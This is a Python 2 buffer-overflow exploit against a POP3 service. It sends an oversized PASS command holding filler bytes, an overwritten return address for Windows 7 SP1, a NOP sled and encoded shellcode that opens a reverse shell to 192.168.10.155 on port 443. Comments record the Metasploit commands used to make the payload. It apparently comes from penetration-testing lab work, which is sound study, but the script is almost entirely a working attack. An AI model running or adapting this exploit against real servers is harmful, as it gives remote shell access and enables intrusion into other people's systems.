#!/usr/bin/python
import socket
 
#Created a buffer with 2700 bytes generated by the pattern_create tool, the EIP offset was at 2606	

# msfpayload windows/shell_reverse_tcp LHOST=192.168.10.155 LPORT=443 EXITFUNC=thread C R | msfencode -b “\x00\x0a\x0d” -s 341

payload = ("\xbf\x23\x38\xd0\xa0\xdb\xc2\xd9\x74\x24\xf4\x58\x29\xc9" +
"\xb1\x4f\x83\xe8\xfc\x31\x78\x10\x03\x78\x10\xc1\xcd\x2c" +
"\x48\x8c\x2e\xcd\x89\xee\xa7\x28\xb8\x3c\xd3\x39\xe9\xf0" +
"\x97\x6c\x02\x7b\xf5\x84\x91\x09\xd2\xab\x12\xa7\x04\x85" +
"\xa3\x06\x89\x49\x67\x09\x75\x90\xb4\xe9\x44\x5b\xc9\xe8" +
"\x81\x86\x22\xb8\x5a\xcc\x91\x2c\xee\x90\x29\x4d\x20\x9f" +
"\x12\x35\x45\x60\xe6\x8f\x44\xb1\x57\x84\x0f\x29\xd3\xc2" +
"\xaf\x48\x30\x11\x93\x03\x3d\xe1\x67\x92\x97\x38\x87\xa4" +
"\xd7\x96\xb6\x08\xda\xe7\xff\xaf\x05\x92\x0b\xcc\xb8\xa4" +
"\xcf\xae\x66\x21\xd2\x09\xec\x91\x36\xab\x21\x47\xbc\xa7" +
"\x8e\x0c\x9a\xab\x11\xc1\x90\xd0\x9a\xe4\x76\x51\xd8\xc2" +
"\x52\x39\xba\x6b\xc2\xe7\x6d\x94\x14\x4f\xd1\x30\x5e\x62" +
"\x06\x42\x3d\xeb\xeb\x78\xbe\xeb\x63\x0b\xcd\xd9\x2c\xa7" +
"\x59\x52\xa4\x61\x9d\x95\x9f\xd5\x31\x68\x20\x25\x1b\xaf" +
"\x74\x75\x33\x06\xf5\x1e\xc3\xa7\x20\xb0\x93\x07\x9b\x70" +
"\x44\xe8\x4b\x18\x8e\xe7\xb4\x38\xb1\x2d\xc3\x7f\x26\x0e" +
"\x7c\x75\x2c\xe6\x7f\x89\x53\x4c\xf6\x6f\x39\xa2\x5f\x38" +
"\xd6\x5b\xfa\xb2\x47\xa3\xd0\x52\xeb\x36\xbf\xa2\x62\x2b" +
"\x68\xf5\x23\x9d\x61\x93\xd9\x84\xdb\x81\x23\x50\x23\x01" +
"\xf8\xa1\xaa\x88\x8d\x9e\x88\x9a\x4b\x1e\x95\xce\x03\x49" +
"\x43\xb8\xe5\x23\x25\x12\xbc\x98\xef\xf2\x39\xd3\x2f\x84" +
"\x45\x3e\xc6\x68\xf7\x97\x9f\x97\x38\x70\x28\xe0\x24\xe0" +
"\xd7\x3b\xed\x10\x92\x61\x44\xb9\x7b\xf0\xd4\xa4\x7b\x2f" +
"\x1a\xd1\xff\xc5\xe3\x26\x1f\xac\xe6\x63\xa7\x5d\x9b\xfc" +
"\x42\x61\x08\xfc\x46")

# retadd is for Windows 7 SP1 - 6.1.7601
buffer = "A"*2606 + "\x8f\x35\x4a\x5f" + "\x90" * 8 + payload


try:
 print 	"Sending PASS buffer (should get a shell on LHOST=192.168.10.155 LPORT=443)"	
 s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect(('192.168.11.136',110))
 s.recv(1024)
 s.send('USER,test\r\n')
 s.recv(1024)
 s.send('PASS,' + buffer + '\r\n')
 s.close()
 print "Buffer sent"
except:
  print "An error occured"
